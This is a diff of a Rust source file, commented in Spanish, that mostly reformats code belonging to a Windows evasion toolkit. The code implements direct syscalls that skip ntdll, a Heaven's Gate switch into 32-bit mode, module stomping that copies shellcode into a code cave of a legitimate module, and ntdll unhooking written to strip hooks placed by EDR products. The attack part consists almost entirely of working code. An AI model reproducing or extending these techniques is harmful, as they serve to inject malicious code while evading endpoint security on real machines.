@@ -2,7 +2,7 @@
 // Ejecuta syscalls directamente sin pasar por ntdll.dll
 
 use std::arch::asm;
-use winapi::shared::ntdef::{NTSTATUS, HANDLE, PVOID};
+use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};
 
 /// Syscall numbers para Windows 10/11 (x64)
 /// Estos números cambian entre versiones de Windows
@@ -119,33 +119,33 @@ pub mod heavens_gate {
 
     /// Ejecuta syscall x86 desde proceso x64 (WoW64)
     pub unsafe fn execute_x86_syscall(syscall_num: u32, args: &[usize]) -> i32 {
-        // Esta técnica usa el segmento de código 0x23 (x86) 
+        // Esta técnica usa el segmento de código 0x23 (x86)
         // en lugar de 0x33 (x64) para ejecutar código 32-bit
-        
+
         let mut result: i32 = 0;
-        
+
         // Far jump a código x86
         asm!(
             "push 0x23",              // Push 32-bit code segment
             "call $+5",               // Get EIP
             "add dword ptr [rsp], 5", // Add offset
             "retf",                   // Far return to x86 mode
-            
+
             // Ahora estamos en x86 mode
             "mov eax, {syscall}",
             "int 0x2E",               // x86 syscall interrupt
-            
+
             // Volver a x64 mode
-            "push 0x33",              // Push 64-bit code segment  
+            "push 0x33",              // Push 64-bit code segment
             "call $+5",
             "add dword ptr [rsp], 5",
             "retf",
-            
+
             syscall = in(reg) syscall_num,
             out("eax") result,
             options(nostack)
         );
-        
+
         result
     }
 }
@@ -153,19 +153,15 @@ pub mod heavens_gate {
 /// Module Stomping - Técnica para inyectar código sin llamar a CreateRemoteThread
 pub mod module_stomping {
     use super::*;
-    use winapi::um::libloaderapi::GetModuleHandleA;
     use std::ffi::CString;
+    use winapi::um::libloaderapi::GetModuleHandleA;
 
     /// Reemplaza código de un módulo legítimo con nuestro código
     /// Bypasses detección de DLL injection tradicional
-    pub unsafe fn stomp_module(
-        target_module: &str,
-        shellcode: &[u8],
-    ) -> Result<(), String> {
+    pub unsafe fn stomp_module(target_module: &str, shellcode: &[u8]) -> Result<(), String> {
         // Obtener handle del módulo target
-        let module_name = CString::new(target_module)
-            .map_err(|_| "Invalid module name")?;
-        
+        let module_name = CString::new(target_module).map_err(|_| "Invalid module name")?;
+
         let module_handle = GetModuleHandleA(module_name.as_ptr());
         if module_handle.is_null() {
             return Err("Module not found".to_string());
@@ -192,11 +188,7 @@ pub mod module_stomping {
         }
 
         // Copiar shellcode al cave
-        std::ptr::copy_nonoverlapping(
-            shellcode.as_ptr(),
-            cave_address,
-            shellcode.len(),
-        );
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), cave_address, shellcode.len());
 
         // Restaurar protección original
         nt_protect_virtual_memory(
@@ -210,17 +202,15 @@ pub mod module_stomping {
     }
 
     /// Encuentra un code cave (espacio vacío) en un módulo
-    unsafe fn find_code_cave(
-        module_base: *mut u8,
-        required_size: usize,
-    ) -> Result<usize, String> {
+    unsafe fn find_code_cave(module_base: *mut u8, required_size: usize) -> Result<usize, String> {
         // Buscar secuencias de bytes 0x00 o 0xCC (int3)
         let mut current = 0;
         let mut cave_size = 0;
 
-        for offset in 0..0x100000 { // Buscar en primeros 1MB
+        for offset in 0..0x100000 {
+            // Buscar en primeros 1MB
             let byte = *module_base.add(offset);
-            
+
             if byte == 0x00 || byte == 0xCC {
                 if cave_size == 0 {
                     current = offset;
@@ -267,16 +257,15 @@ pub mod module_stomping {
 /// Unhooking ntdll.dll - Remueve hooks colocados por EDRs
 pub mod unhook {
     use super::*;
+    use std::ffi::CString;
     use winapi::um::libloaderapi::{GetModuleHandleA, LoadLibraryA};
     use winapi::um::memoryapi::VirtualProtect;
-    use std::ffi::CString;
 
     /// Remueve hooks de ntdll.dll restaurando desde disco
     pub unsafe fn unhook_ntdll() -> Result<(), String> {
         // Cargar una copia limpia de ntdll.dll desde disco
-        let ntdll_name = CString::new("ntdll.dll")
-            .map_err(|_| "Failed to create CString")?;
-        
+        let ntdll_name = CString::new("ntdll.dll").map_err(|_| "Failed to create CString")?;
+
         let clean_ntdll = LoadLibraryA(ntdll_name.as_ptr());
         if clean_ntdll.is_null() {
             return Err("Failed to load clean ntdll".to_string());
@@ -324,7 +313,10 @@ mod tests {
 
     #[test]
     fn test_syscall_numbers() {
-        println!("NtReadVirtualMemory: 0x{:X}", SyscallNumber::NtReadVirtualMemory as u32);
+        println!(
+            "NtReadVirtualMemory: 0x{:X}",
+            SyscallNumber::NtReadVirtualMemory as u32
+        );
         println!("NtOpenProcess: 0x{:X}", SyscallNumber::NtOpenProcess as u32);
     }
 }
